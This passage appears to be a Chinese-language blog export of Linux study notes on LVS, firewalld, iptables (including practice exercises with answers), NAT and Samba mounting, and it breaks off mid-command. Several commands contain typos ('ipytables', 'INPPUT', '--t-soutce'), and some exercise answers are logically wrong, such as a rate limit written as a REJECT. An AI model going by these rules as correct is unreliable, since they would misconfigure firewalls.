lvs-dr：通过封装新的MAC首部实现，通过MAC网络转发lvs-tun：通过在原IP报文外封装新IP头实现转发，支持远距离通信]]></content>
      <categories>
        <category>LVS</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>internet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[firewalld]]></title>
    <url>%2Ffirewalld.html</url>
    <content type="text"><![CDATA[摘要： firewalld介绍 firewalld配置命令 rich规则 伪装及端口转发 FireWalld firewalld是CentOS 7.0新推出的管理netfilter的工具 firewalld是配置和监控防火墙规则的系统守护进程。可以实现iptables,ip6tables,ebtables的功能 firewalld服务由firewalld包提供 firewalld支持划分区域zone,每个zone可以设置独立的防火墙规则 归入zone顺序： 先根据数据包中源地址，将其纳为某个zone 纳为网络接口所属zone 纳入默认zone，默认为public zone,管理员可以改为其它zone 网卡默认属于public zone,lo网络接口属于trusted zone Firewalld配置 firewall-cmd --get-services 查看预定义服务列表 /usr/lib/firewalld/services/*.xml预定义服务的配置 三种配置方法 firewall-config （firewall-config包）图形工具firewall-cmd （firewalld包）命令行工具/etc/firewalld 配置文件，一般不建议 firewall-cmd 命令选项12]# yum install firewalld -y]# systemctl restart firewalld 参数说明： 12345678910111213141516--get-zones 列出所有可用区域--get-default-zone 查询默认区域--set-default-zone=&lt;ZONE&gt; 设置默认区域--get-active-zones 列出当前正使用的区域--add-source=&lt;CIDR&gt;[--zone=&lt;ZONE&gt;] 添加源地址的流量到指定区域，如果无--zone= 选项，使用默认区域--remove-source=&lt;CIDR&gt; [--zone=&lt;ZONE&gt;] 从指定区域中删除源地址的流量，如无--zone= 选项，使用默认区域--add-interface=&lt;INTERFACE&gt;[--zone=&lt;ZONE&gt;] 添加来自于指定接口的流量到特定区域，如果无--zone= 选项，使用默认区域--change-interface=&lt;INTERFACE&gt;[--zone=&lt;ZONE&gt;] 改变指定接口至新的区域，如果无--zone= 选项，使用默认区域--add-service=&lt;SERVICE&gt; [--zone=&lt;ZONE&gt;] 允许服务的流量通过，如果无--zone= 选项，使用默认区域--add-port=&lt;PORT/PROTOCOL&gt;[--zone=&lt;ZONE&gt;] 允许指定端口和协议的流量，如果无--zone= 选项，使用默认区域--remove-service=&lt;SERVICE&gt; [--zone=&lt;ZONE&gt;] 从区域中删除指定服务，禁止该服务流量，如果无--zone= 选项，使用默认区域--remove-port=&lt;PORT/PROTOCOL&gt;[--zone=&lt;ZONE&gt;] 从区域中删除指定端口和协议，禁止该端口的流量，如果无--zone= 选项，使用默认区域--reload 删除当前运行时配置，应用加载永久配置--list-services 查看开放的服务--list-ports 查看开放的端口--list-all [--zone=&lt;ZONE&gt;] 列出指定区域的所有配置信息，包括接口，源地址，端口，服务等，如果无--zone= 选项，使用默认区域 示例 查看默认zone 1firewall-cmd --get-default-zone 默认zone设为dmz 1firewall-cmd --set-default-zone=dmz 在internal zone中增加源地址192.168.0.0/24的永久规则 1firewall-cmd --permanent --zone=internal --add-source=192.168.1.0/24 在internal zone中增加协议mysql的永久规则 1firewall-cmd --permanent –zone=internal --add-service=mysql 加载新规则以生效 1firewall-cmd --reload rich-rules规则 当基本firewalld语法规则不能满足要求时，可以使用以下更复杂的规则 rich-rules 富规则，功能强,表达性语言 Direct configuration rules 直接规则，灵活性差。帮助：man 5 firewalld.direct rich规则比基本的firewalld语法实现更强的功能，不仅实现允许/拒绝，还可以实现日志syslog和auditd，也可以实现端口转发，伪装和限制速率 rich语法 1234567rule[source][destination]service|port|protocol|icmp-block|masquerade|forward-port[log][audit][accept|reject|drop] 基本用法 12345678--add-rich-rule=&apos;&lt;RULE&gt;&apos; Add &lt;RULE&gt; to the specified zone, or the default zone if no zone is specified.--remove-rich-rule=&apos;&lt;RULE&gt;&apos; Remove &lt;RULE&gt; to the specified zone, or the default zone if no zone is specified.--query-rich-rule=&apos;&lt;RULE&gt;&apos; Query if &lt;RULE&gt; has been added to the specified zone, or the default zone ifno zone is specified. Returns 0 if the rule is present, otherwise 1. --list-rich-rules Outputs all rich rules for the specified zone, or the default zone if no zone isspecified. rich规则示例 拒绝从192.168.0.11的所有流量，当address 选项使用source 或 destination时，必须用family= ipv4 |ipv6. 1]# firewall-cmd --permanent --zone=classroom --add-rich-rule=&apos;rule family=ipv4 source address=192.168.0.11/32 reject‘ 限制每分钟只有两个连接到ftp服务 1firewall-cmd --add-rich-rule=‘rule service name=ftp limit value=2/m accept’ 抛弃esp（ IPsec 体系中的一种主要协议）协议的所有数据包 1firewall-cmd --permanent --add-rich-rule=&apos;rule protocol value=esp drop&apos; 接受所有192.168.1.0/24子网端口5900-5905范围的TCP流量 1]# firewall-cmd --permanent --zone=vnc --add-rich-rule=&apos;rule family=ipv4 source address=192.168.1.0/24 port port=5900-5905 protocol=tcp accept&apos; 接受ssh新连接，记录日志到syslog的notice级别，每分钟最多三条信息 1]# firewall-cmd --permanent --zone=work --add-rich-rule=&apos;rule servicename=&quot;ssh&quot; log prefix=&quot;ssh &quot; level=&quot;notice&quot; limit value=&quot;3/m&quot; accept 从2001:db8::/64子网的DNS连接在5分钟内被拒绝，并记录到日志到audit,每小时最大记录一条信息 1]# firewall-cmd --add-rich-rule=&apos;rule family=ipv6 source address=&quot;2001:db8::/64&quot; service name=&quot;dns&quot; audit limit value=&quot;1/h&quot; reject&apos; --timeout=300 伪装和端口转发NAT网络地址转换，firewalld支持伪装和端口转发两种NAT方式 伪装NAT 1234firewall-cmd --permanent --zone= &lt;ZONE&gt; --add-masqueradefirewall-cmd --query-masquerade 检查是否允许伪装firewall-cmd --add-masquerade 允许防火墙伪装IPfirewall-cmd --remove-masquerade 禁止防火墙伪装IP 示例： 1firewall-cmd --add-rich-rule=&apos;rule family=ipv4 source address=192.168.0.0/24 masquerade&apos; 端口转发 将发往本机的特定端口的流量转发到本机或不同机器的另一个端口。通常要配合地址伪装才能实现 命令行如下： 12firewall-cmd --permanent --zone= &lt;ZONE&gt; --add-forward-port=port= &lt;PORTNUMBER&gt; :proto= &lt;PROTOCOL&gt; [:toport= &lt;PORTNUMBER&gt; ][:toaddr= ]说明：toport= 和toaddr= 至少要指定一个 示例：转发传入的连接9527/TCP，到防火墙的80/TCP到public zone 的192.168.0.25412firewall-cmd --add-masquerade 启用伪装firewall-cmd --zone=public --add-forward-port=port=9527:proto=tcp:toport=80:toaddr=192.168.0.254]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>Safe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IptablesTest]]></title>
    <url>%2Fiptables1.html</url>
    <content type="text"><![CDATA[摘要：iptabels练习题 习题 说明：以下练习INPUT和OUTPUT默认策略均为DROP 限制本地主机的web服务器在周一不允许访问；新请求的速率不能超过100个每秒；web服务器包含了admin字符串的页面不允许访问；web服务器仅允许响应报文离开本机 在工作时间，即周一到周五的8:30-18:00，开放本机的ftp服务给172.20.0.0网络中的主机访问；数据下载请求的次数每分钟不得超过5个 开放本机的ssh服务给172.20.x.1-172.20.x.100中的主机，x为你的学号，新请求建立的速率一分钟不得超过2个；仅允许响应报文通过其服务端口离开本机 拒绝TCP标志位全部为1及全部为0的报文访问本机； 允许本机ping别的主机；但不开放别的主机ping本机 答案one 限制本地主机的web服务器在周一不允许访问；新请求的速率不能超过100个每秒；web服务器包含了admin字符串的页面不允许访问；web服务器仅允许响应报文离开本机 1234567891011121314151617181920212223242526#周一不允许访问：time扩展#新请求的速率不能超过100个每秒：state扩展+limit扩展#admin字符串的页面不允许访问：string扩展#仅允许响应报文离开本机：tcp：80为源端口#把正在连接的ssh设为接受iptables -A INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPTiptables -A OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT #新建一个链，负责有关web服务iptables -N web1#1.周一不允许访问：centos7默认UTC时间iptables -A web1 -p tcp --dport 80 -m time --weekdays 1 -j REJECT#(北京时间） iptables -A web1 -p tcp --dport 80 -m time --weekdays 7 --timestart 16:00 \--timestop 23:59:59 -m time --weekdays 1 --timestart 00:00 --timestop 16:00 -j REJECT#2.新请求的速率不能超过100个每秒iptables -A web1 -p tcp --dport 80 -m state --state NEW \-m limit --limit 100/second -j REJECT#3.admin字符串的页面不允许访问iptables -A OUTPUT -p tcp --sport 80 -m string --algo bm --string &quot;admin&quot; -j REJECT#4.仅允许响应报文离开本机iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT #5.将新建的链加入到INPUT链 iptables -A INPUT -j web1#6.其余关于INPUT和OUTPUT的全部DROPiptables -A OUTPUT -j DROPiptables -A INPUT -j DROP two 在工作时间，即周一到周五的8:30-18:00，开放本机的ftp服务给172.20.0.0网络中的主机访问；数据下载请求的次数每分钟不得超过5个 12345678910111213141516171819#允许正在链接的用户iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT#新建链ipytables -N ftpi#ftp为多端口服务，首先把state状态的相关包和端口打开iptables -A ftpi -m state --state ESTABLISHED -m state --state RELATED -j ACCEPT#周一到周五的8:30-18:00，开放ftp服务给172.20.0.0：tcp:21端口iptables -A ftpi -s 172.20.0.0/16 -p tcp --dport 21 -m time \--timestart 00:30 --timestop 10:00 --weekdays 1,2,3,4,5 -j ACCEPT #数据下载请求的次数每分钟不得超过5个#应该放到state状态的相关包和端口打开的前面iptables -I ftpi -p tcp --dport 21 -m state --state RELATED \ -m string --algo bm --string &quot;get&quot; -m limit --limit 5/minute -j ACCEPT#把链接放到INPUT中iptables -A INPUT -j ftpi#剩余全丢弃 iptables -A OUTPUT -j DROPiptables -A INPUT -j DROP three 开放本机的ssh服务给172.20.x.1-172.20.x.100中的主机，x为你的学号，新请求建立的速率一分钟不得超过2个；仅允许响应报文通过其服务端口离开本机 12345678910111213141516171819202122#允许正在链接的用户iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT#新建链sshiiptables -N sshi#ssh服务给172.20.0.1-172.20.0.100中的主机，新请求建立的速率一分钟不得超过2个iptables -A sshi -m iprange --src-rang 172.20.0.1-172.20.0.100 -p tcp \--dport 22 -m state --state NEW -m limit --limit 2/minute -j ACCEPT#除了新建立链接，别的指定IP ssh 链接都可以通过iptables -A sshi -m iprange --src-rang 172.20.0.1-172.20.0.100 \-p tcp --dport 22 -j ACCEPT #新建链 iptables -N ssho #仅允许响应报文通过其服务端口离开本机iptables -A ssho -m iprange --dst-rang 172.20.0.1-172.20.0.100 \-p tcp --sport 22 -j ACCEPT#将链接加入INPUT和OUTPUT中iptables -I INPUT -j sshiiptables -I OUTPUT -j ssho #剩余全丢弃iptables -A OUTPUT -j DROPiptables -A INPUT -j DROP four 拒绝TCP标志位全部为1及全部为0的报文访问本机； 123456789101112#允许正在链接的用户iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT#新建链tcpiiptables -N tcpiiptables -A tcpi -p tcp --tcp-flags ALL ALL -j REJECTiptables -A tcpi -p tcp --tcp-flags ALL NONE -j REJECT #允许正在链接的用户iptables -I INPUT -j tcpi#剩余全丢弃iptables -A OUTPUT -j DROPiptables -A INPUT -j DROP five 允许本机ping别的主机；但不开放别的主机ping本机 123456789101112#允许正在链接的用户iptables -I INPUT -p tcp --dport 22 -s 172.20.0.16 -j ACCEPT iptables -I OUTPUT -p tcp --sport 22 -d 172.20.0.16 -j ACCEPT#允许OUTPUT发出请求包iptables -I OUTPUT -p icmp --icmp-type 8/0 -j ACCEPT#允许INPUT接受回应包iptables -I INPUT -p icmp --icmp-type 0/0 -j ACCEPT#拒绝INPUT的请求包 iptables -I INPUT -p icmp --icmp-type 8/0 -j REJECT #剩余全丢弃iptables -A OUTPUT -j DROPiptables -A INPUT -j DROP]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>Safe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables]]></title>
    <url>%2Fiptables.html</url>
    <content type="text"><![CDATA[摘要： 防火墙的概念 iptables的基本认识 iptables的组成 iptables的基本语法 iptables之forward的概念 iptables之地址转换法则 SNAT源地址转换的具体实现 DNAT目标地址转换的具体实现 安全技术 入侵检测与管理系统（Intrusion Detection Systems）：特点是不阻断任何网络访问，量化、定位来自内外网络的威胁情况，主要以提供报告和事后监督为主，有针对性的指导措施和安全决策依据。一般采用旁路部署方式； 入侵防御系统（Intrusion Prevention System）：以透明模式工作，分析数据包的内容如：溢出攻击、拒绝服务攻击、木马、蠕虫、系统漏洞等进行准确的分析判断，在判定为攻击行为后立即予以阻断，主动而有效的保护网络的安全，一般采用在线部署方式； 防火墙（ FireWall ）：隔离工具，工作在网络或主机边缘，对进出网络或主机的报文，根据事先定义好的检查规则作匹配检测，对于能够被规则所匹配的报文做出相应处理的组件，基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。 防火墙的分类 主机防火墙：服务范围为当前主机网络防火墙：服务范围为防火墙一侧的局域网 硬件防火墙：在专用硬件级别实现部分功能的防火墙；另一个部分功能基于软件实现，Checkpoint,NetScreen 软件防火墙：运行于通用硬件平台之上的防火墙的应用软件 网络层防火墙：OSI下面第三层应用层防火墙/代理服务器：代理网关，OSI七层 网络层防火墙 包过滤防火墙 网络层对数据包进行选择，选择的依据是系统内设置的过滤逻辑，被称为访问控制列表（ACL），通过检查数据流中每个数据的源地址，目的地址，所用端口号和协议状态等因素，或他们的组合来确定是否允许该数据包通过. 优点：对用户来说透明，处理速度快且易于维护 缺点：无法检查应用层数据，如病毒等 应用层防火墙应用层防火墙/代理服务型防火墙（Proxy Service） 将所有跨越防火墙的网络通信链路分为两段 内外网用户的访问都是通过代理服务器上的“链接”来实现 优点：在应用层对数据进行检查，比较安全 缺点：增加防火墙的负载 iptables的基本认识Netfilter组件 内核空间，集成在linux内核中 扩展各种网络服务的结构化底层框架 内核中选取五个位置放了五个hook(勾子) function(INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING)，而这五个hook function向用户开放，用户可以通过一个命令工具（iptables）向其写入规则。 1234]#cat config-3.10.0-693.el7.x86_64 |grep -i iptablesCONFIG_IP_NF_IPTABLES=mCONFIG_IP6_NF_IPTABLES=m# iptables trigger is under Netfilter config (LED target) 由信息过滤表（table）组成，包含控制IP包处理的规则集（rules），规则被分组放在链（chain）上 三种报文流向： 123流入本机：PREROUTING --&gt; INPUT--&gt;用户空间进程流出本机：用户空间进程 --&gt;OUTPUT--&gt; POSTROUTING转发：PREROUTING --&gt; FORWARD --&gt; POSTROUTING iptables的组成iptables由四个表和五个链以及一些规则组成 四个表table：filter、nat、mangle、raw 1234567filter表:过滤规则表，根据预定义的规则过滤符合条件的数据包nat表:network address translation 地址转换规则表mangle:修改数据标记位规则表 http 80 mangle 10 https 443 mangle 10Raw:关闭NAT表上启用的连接跟踪机制，加快封包穿越防火墙速度优先级由高到低的顺序为:raw--&gt;mangle--&gt;nat--&gt;filter 五个内置链chain12345INPUTOUTPUTFORWARDPREROUTINGPOSTROUTING Netfilter表与chain对应联系 iptables 命令 DESCRIPTION Iptables and ip6tables are used to set up, maintain, and inspect the tables of IPv4 and IPv6 packet filter rules in the Linux kernel. Several different tables may be defined. Each table contains a number of built-in chains and may also contain user-defined chains. Each chain is a list of rules which can match a set of packets. Each rule specifies what to do with a packet that matches. This is called a ‘target’, which maybe a jump to a user-defined chain in the same table. 选项 123456789101112iptables [-t table] &#123;-A|-C|-D&#125; chain rule-specificationip6tables [-t table] &#123;-A|-C|-D&#125; chain rule-specificationiptables [-t table] -I chain [rulenum] rule-specificationiptables [-t table] -R chain rulenum rule-specificationiptables [-t table] -D chain rulenumiptables [-t table] -S [chain [rulenum]]iptables [-t table] &#123;-F|-L|-Z&#125; [chain [rulenum]] [options...]iptables [-t table] -N chainiptables [-t table] -X [chain]iptables [-t table] -P chain targetiptables [-t table] -E old-chain-name new-chain-namerule-specification = [matches...] [target] 系统默认的防火墙规则关闭 1234systemctl stop firewalldsystemctl disable firewalldservice iptables stopchkconfig iptables off 自己编写防火墙规则。 12345]# iptables -t filter -A INPUT -s 192.168.1.11 -j REJECT]# iptables -t filter -A INPUT -s 192.168.1.0/24 -j REJECT]# iptables -t filter -I INPUT 2 -s 192.168.1.18 -j REJECT]# iptables -vnL --line-numbers]# iptables -D INPUT 1 链管理： 123456-N：new, 自定义一条新的规则链-X：delete，删除自定义的空的规则链-P：Policy，设置默认策略；对filter表中的链而言，其默认策略有： ACCEPT：接受 DROP：丢弃-E：重命名自定义链；引用计数不为0的自定义链不能够被重命名，也不能被删除 查看： 12345678910-L：list, 列出指定鏈上的所有规则，本选项须置后-n：numberic，以数字格式显示地址和端口号-v：verbose，详细信息-vv 更详细-x：exactly，显示计数器结果的精确值,而非单位转换后的易读值--line-numbers：显示规则的序号常用组合：--vnL--vvnxL --line-numbers-S selected,以iptables-save 命令格式显示链上规则 规则管理： 123456789101112-A：append，追加-I：insert, 插入，要指明插入至的规则编号，默认为第一条-D：delete，删除(1) 指明规则序号(2) 指明规则本身-R：replace，替换指定链上的指定规则编号-F：flush，清空指定的规则链-Z：zero，置零iptables的每条规则都有两个计数器(1) 匹配到的报文的个数(2) 匹配到的所有报文的大小之和chain： PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING 基本用法和扩展用法 基本匹配条件：无需加载模块，由iptables/netfilter自行提供 [!] -s, --source address[/mask][,...]：源IP地址或范围 1]# iptables -A INPUT -s 192.168.1.8 -p tcp --dport 139 -j REJECT [!] -d, --destination address[/mask][,...]：目标IP地址或范围 1]# iptables -A OUTPUT -d 192.168.1.0/24 -j ACCEPT [!] -p, --protocol protocol：指定协议，可使用数字如0（all）protocol: tcp, udp, icmp, icmpv6, udplite,esp, ah, sctp, mh or “all“ 参看：/etc/protocols 1]# iptables -A INPUT -s 192.168.1.8 -p tcp --dport 445 -j REJECT [!] -i, --in-interface name：报文流入的接口；只能应用于数据报文流入环节，只应用于INPUT、FORWARD、PREROUTING 链 1~]# iptables -A OUTPUT -o lo -j ACCEPT [!] -o, --out-interface name：报文流出的接口；只能应用于数据报文流出的环节，只应用于 FORWARD、OUTPUT 、 POSTROUTING 链 扩展匹配条件：需要加载扩展模块（/usr/lib64/xtables/*.so），方可生效 查看帮助 man iptables-extensions (1)隐式扩展：在使用-p选项指明了特定的协议时，无需再用-m选项指明扩展模块的扩展 机制，不需要手动加载扩展模块 tcp协议的扩展选项 123[!] --source-port, --sport port[:port]：匹配报文源端口,可为端口范围[!] --destination-port,--dport port[:port]：匹配报文目标端口,可为范围[!] --tcp-flags mask comp 显式扩展：必须使用-m选项指明要调用的扩展模块的扩展机制，要手动加载扩展模块 [-m matchname [per-match-options]] 1234567891011]# iptables -A INPUT -p tcp --syn -j REJECT #拒绝首次tcp链接,已经链接的不拒绝]# iptables -A INPUT -p icmp --icmp-type 8 -j REJECT #禁ping]# rpm -ql iptables | grep multiport #多端口/usr/lib64/xtables/libxt_multiport.so]# iptables -A INPUT -p tcp -m multiport --dport 21,80,139,445 -j REJECT]# iptables -A INPUT -s IP -j ACCEPT]# iptables -A OUTPUT -s IP -j ACCEPT]# iptables -A INPUT -j REJECT]# iptables -A OUTPUT -j REJECT]# iptables -A INPUT -p tcp -m multiport --dport 22,80,139,445 -j ACCEPT]# iptables -A OUTPUT -p tcp -m multiport --sport 22,80,139,445 -j ACCEPT tips：利用telnet测试是否filter成功 自定义链 增加自定义链123iptables -N WEBiptables -A WEB -P tcp -m multiport --dports 80,443 -j ACCEPTiptables -I INPUT -s 192.168.1.0/24 -j WEB 删除自定义链123iptables -D INPUT 1iptables -D WEB 1iptables -X WEB string扩展 对报文中的应用层数据做字符串模式匹配检测 1234567--algo &#123;bm|kmp&#125;：字符串匹配检测算法bm：Boyer-Moorekmp：Knuth-Pratt-Morris--from offset 开始偏移--to offset 结束偏移[!] --string pattern：要检测的字符串模式[!] --hex-string pattern：要检测字符串模式，16进制格式 例如：只要匹配到google的，全部拒绝。1iptables -A OUTPUT -m string --algo bm --string &quot;google&quot; -j REJECT time扩展 根据将报文到达的时间与指定的时间范围进行匹配1234567--datestart YYYY[-MM[-DD[Thh[:mm[:ss]]]]] 日期--datestop YYYY[-MM[-DD[Thh[:mm[:ss]]]]]--timestart hh:mm[:ss] 时间--timestop hh:mm[:ss][!] --monthdays day[,day...] 每个月的几号[!] --weekdays day[,day...] 星期几--kerneltz：内核时区，不建议使用，CentOS7系统默认为UTC 例如：1iptables -A INPUT -s 172.20.0.0/16 -d 172.16.100.10 -p tcp --dport 80 -m time --timestart 14:30 --timestop 18:30 --weekdays Sat,Sun --kerneltz -j DROP state扩展根据”连接追踪机制“去检查连接的状态，较耗资源，用的也相对多，例如nat技术。 conntrack机制：追踪本机上的请求和响应之间的关系 状态有如下几种：12345NEW：新发出请求；连接追踪信息库中不存在此连接的相关信息条目，因此，将其识别为第一次发出的请求ESTABLISHED：NEW状态之后，连接追踪信息库中为其建立的条目失效之前期间内所进行的通信状态RELATED：新发起的但与已有连接相关联的连接，如：ftp协议中的数据连接与命令连接之间的关系INVALID：无效的连接，如flag标记不正确UNTRACKED：未进行追踪的连接，如raw表中关闭追踪 例如： 12iptables -I INPUT 1 -s 192.168.1.0/24 -m state --state NEW -j REJECTiptables -I INPPUT 1 -m state --state ESTABLISHED -j ACCEPT iptables的链接跟踪表最大容量为/proc/sys/net/nf_conntrack_max，各种状态的超时链接会从表中删除；当模板满载时，后续连接可能会超时 12345678910(1) 加大 nf_conntrack_max 值vi /etc/sysctl.confnet.nf_conntrack_max = 393216net.netfilter.nf_conntrack_max = 393216(2) 降低 nf_conntrack timeout 时间vi /etc/sysctl.confnet.netfilter.nf_conntrack_tcp_timeout_established = 300net.netfilter.nf_conntrack_tcp_timeout_time_wait = 120net.netfilter.nf_conntrack_tcp_timeout_close_wait = 60net.netfilter.nf_conntrack_tcp_timeout_fin_wait = 120 iptables策略总结任何不允许的访问，应该在请求到达时给予拒绝规则在链接上的次序即为其检查时的生效次序 基于上述，规则优化 安全放行所有入站和出站的状态为ESTABLISHED状态连接 谨慎放行入站的新请求 有特殊目的限制访问功能，要在放行规则之前加以拒绝 同类规则（访问同一应用），匹配范围小的放在前面，用于特殊处理 不同类的规则（访问不同应用），匹配范围大的放在前面 应该将那些可由一条规则能够描述的多个规则合并为一条 设置默认策略，建议白名单（只放行特定连接）a. iptables -P，不建议b. 建议在规则的最后定义规则做为默认策略 iptables具体应用试验 试验拓扑图如下: 内网用户：192.168.1.0/24 router：192.168.1.0/24 ; 10.0.0.254/8,注意：这里假想10.0.0.0/8为所有的外网用户，且用linux主机充当。 外网：10.0.0.0/8 ； 外网web：10.0.0.8/8 ； 外网的client：10.0.0.17/8 实现内网安全只需在防火墙上的router上添加几条规则即可。 要求：有客户端想访问192.168.1.18:80的web资源，并且内网用户能访问外网 123456]# echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf]# systcl -p]# iptables -A FORWARD -j REJECT]# iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT]# iptables -I FORWARD 2 -s 192.168.1.0/24 -d 0.0.0.0/0 -m state --state NEW -j ACCEPT]# iptables -I FORWARD 2 -d 192.168.1.0/24 -p tcp --dport 80 -m state --state NEW -j ACCEPT NAT NAT: network address translation PREROUTING，INPUT，OUTPUT，POSTROUTING请求报文：修改源/目标IP，由定义如何修改响应报文：修改源/目标IP，根据跟踪机制自动实现 SNAT：source NAT POSTROUTING, INPUT 让本地网络中的主机通过某一特定地址访问外部网络，实现地址伪装请求报文：修改源IP DNAT：destination NAT PREROUTING , OUTPUT 把本地网络中的主机上的某服务开放给外部网络访问(发布服务和端口映射)，但隐藏真实IP请求报文：修改目标IP PNAT: port nat，端口和IP都进行修改 SNAT SNAT：固定IP 123--to-source [ipaddr[-ipaddr]][:port[-port]]--randomiptables -t nat -A POSTROUTING -s LocalNET -j SNAT --t-soutce ExtIP 示例，依旧利用上述网络拓扑试验图，在router上设置，： 123]# echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf]# sysctl -p]# iptables -t nat -A POSTROUTING -s 192.168.1.0/24 ! -d 192.168.1.0/24 -j SNAT --to-source 10.0.0.254 MASQUERADE：动态IP，如拨号网络 123--to-ports port[-port]--randomiptables -t nat -A POSTROUTING -s LocalNET ! -d LocalNet -j MASQUERADE 示例： 1iptables -t nat -A POSTROUTING -s 192.168.1.0/24 ! -d 192.168.1.0/24 -j MASQUERADE DNAT DNAT 12--to-destination [ipaddr[-ipaddr]][:port[-port]]iptables -t nat -A PREROUTING -d ExtIP -p tcp|udp --dport PORT -j DNAT --to-destination InterSeverIP[:PORT] 示例，依旧是上面的网络拓扑试验图router上进行设置： 12]# iptables -t nat -A PREROUTING -s 0/0 -d 10.0.0.254 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.18:80]# iptables -vnL -t nat 端口转发 1]# iptables -t nat -A PREROUTING -d 192.168.1.18 -p tcp --dport 80 -j REDIRECT --to-port 8080]]></content>
      <categories>
        <category>internet</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>Linux</tag>
        <tag>Safe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Samba]]></title>
    <url>%2Fsamba.html</url>
    <content type="text"><![CDATA[摘要：Samba服务简介，配置文件解释，多用户挂载Samba； SAMBA服务简介 SMB：Server Message Block服务器消息块，IBM发布，最早是DOS网络文件共享协议 Cifs：common internet file system，微软基于SMB发布 SAMBA:1991年Andrew Tridgell,实现windows和UNIX相通 SAMBA的功能： 共享文件和打印，实现在线编辑 实现登录SAMBA用户的身份认证 可以进行NetBIOS名称解析 外围设备共享 计算机网络管理模式： 工作组WORKGROUP：计算机对等关系，帐号信息各自管理域DOMAIN:C/S结构，帐号信息集中管理，DC,AD 相关包： Samba 提供smb服务Samba-client 客户端软件samba-common 通用软件cifs-utils smb客户端工具samba-winbind 和AD相关 相关服务进程： 12smbd 提供smb（cifs）服务 TCP:139,445nmbd NetBIOS名称解析 UDP:137,138 主配置文件：/etc/samba/smb.conf 帮助参看：man smb.conf 语法检查： testparm [-v][/etc/samba/smb.conf] 客户端工具：smbclient,mount.cifs Samba服务器设置 smb.conf继承了.ini文件的格式，用[ ] 分成不同的部分 全局设置：[global] 服务器通用或全局设置的部分 特定共享设置： [homes] 用户的家目录共享[printers] 定义打印机资源和服务[sharename] 自定义的共享目录配置 其中：#和;开头的语句为注释，大小写不敏感 宏定义： 12345678910%m 客户端主机的NetBIOS名 %M 客户端主机的FQDN%H 当前用户家目录路径 %U 当前用户用户名%g 当前用户所属组 %h samba服务器的主机名%L samba服务器的NetBIOS%I 客户端主机的IP%T 当前日期和时间 %S 可登录的用户名 global设置 workgroup 指定工作组名称 server string 主机注释信息 netbios name 指定NetBIOS名 interfaces 指定服务侦听接口和IP hosts allow 可用“,” ，空格，或tab分隔，默认允许所有主机访问，也可在每个共享独立配置，如在[global]设置，将应用并覆盖所有共享设置 1234567IPv4 network/prefix: 172.25.0.0/24 IPv4前缀: 172.25.0.IPv4 network/netmask: 172.25.0.0/255.255.255.0主机名: desktop.example.com以example.com后缀的主机名: .example.com示例：hosts allow = 172.25.hosts allow = 172.25. .example.com hosts deny 拒绝指定主机访问 config file=/etc/samba/conf.d/%U 用户独立的配置文件 Log file=/var/log/samba/log.%m 不同客户机采用不同日志 max log size=50 日志文件达到50K，将轮循rotate,单位KB Security三种认证方式： 123share：匿名(CentOS7不再支持)user：samba用户（采有linux用户，samba的独立口令）domain:使用DC（DOMAIN CONTROLLER)认证 passdb backend = tdbsam 密码数据库格式 实现samba用户： 123包： samba-common-tools工具：smbpasswd pdbeditsamba用户须是Linux用户，建议使用/sbin/nologin 配置目录共享 每个共享目录应该有独立的[ ]部分 123456789[共享名称] 远程网络看到的共享名称comment 注释信息path 所共享的目录路径public 能否被guest访问的共享，默认no，和guest ok 类似browsable 是否允许所有用户浏览此共享,默认为yes,no为隐藏writable=yes 可以被所有用户读写，默认为noread only=no 和writable=yes等价，如与以上设置冲突，放在后面的设置生效，默认只读write list 三种形式：用户，@组名，+组名,用，分隔如writable=no，列表中用户或组可读写，不在列表中用户只读valid users 特定用户才能访问该共享，如为空，将允许所有用户，用户名之间用空格分隔 samba用户访问 UNC路径: Universal Naming Convention,通用命名规范 格式：\\sambaserver\sharename 终端下使用smbclient登录服务器 1234567smbclient -L instructor.example.comsmbclient -L instructor.example.com -U wang&gt; cd directory&gt; get file1&gt; put file2smbclient //instructor.example.com/shared -U wang可以使用-U选项来指定用户%密码，或通过设置和导出USER和PASSWD环境变量来指定 挂载samba服务器的共享文件 手动挂载 1mount -t cifs -o user=hong,password=passwd //192.168.1.18/shared /mnt/smb 开机自动挂载 123456]#cat /etc/fstab #可以用文件代替用户名和密码的输入//192.168.1.18/homes /mnt/hong cifs credentials=/etc/user.txt 0 0]# cat /etc/user.txtusername=hongpassword=password]# chmod 600 /etc/user.txt 多用户samba挂载 CentOS7中可启用多用户挂载功能 客户端挂载samba共享目录后，在客户端登录的不同用户访问同一个samba的挂载点，可获得不同权限 服务器ip：192.168.1.18 samba服务器配置 1234567]# yum install samba]# mkdir /multiuser]# vim /etc/samba/smb.conf[smbshare]path=/multiuserwritable=nowrite list= @admins samba服务器创建samba用户，并添加密码 123456]# useradd -s /sbin/nologin smb1]# useradd -s /sbin/nologin -G admins hong]# useradd -s /sbin/nologin -G admins feng]# smbpasswd -a smb1]# smbpasswd -a hong]# 